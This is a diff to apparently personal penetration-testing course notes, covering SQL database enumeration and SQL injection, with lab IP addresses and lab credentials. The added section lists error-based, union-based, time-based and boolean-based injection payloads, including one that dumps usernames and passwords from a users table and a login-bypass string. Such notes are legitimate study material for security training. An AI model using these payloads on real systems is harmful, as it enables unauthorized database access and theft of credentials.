@@ -359,7 +359,7 @@
 - MySQL, Microsoft SQL Server, PostgreSQL, and Oracle
 - `mysql -u root -p'root' -h 192.168.50.16 -P 3306`: connect mysql
 - `select version();  select system_user();  show databases;  SELECT user, authentication_string FROM mysql.user WHERE user ='offsec';`. password hashing [Caching-SHA-256 algorithm]
-- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`: remove MSSQL via Kali Impacket  
+- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`: remote MSSQL via Kali Impacket  
 - `SELECT @@version;  SELECT name FROM sys.databases;  SELECT * FROM offsec.information_schema.tables;  select * from offsec.dbo.users`
 - SELECT * FROM users WHERE user_name= 'offsec  `' OR 1=1 --`: bypass login
 - Error-based
@@ -758,7 +758,26 @@
     SHOW TABLES;
     SELECT * FROM users
     ```
-- 
+- 10.33.1 Manual Code execution
+  - error based
+    username: offsec'
+    `offsec' OR 1=1 --//`
+    `' or 1=1 in (select @@version) -- //`
+    `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
+  - union-based
+    ```
+    ' ORDER BY 1 -- //
+    %' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+    %' UNION SELECT database(), user(), @@version, null, null -- //
+    ' UNION SELECT null, null, database(), user(), @@version  -- //
+    ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+    ' UNION SELECT null, username, password, description, null FROM users -- //
+    ```
+  - time-based
+    `' AND IF (1=1, sleep(3),'false') -- //`
+  - boolean-based
+    `' AND 1=1 -- //`
+- 10.3.2. Automating the Attack
 
 ### Client-site attacks  
 - 12.1.1 Information Gathering
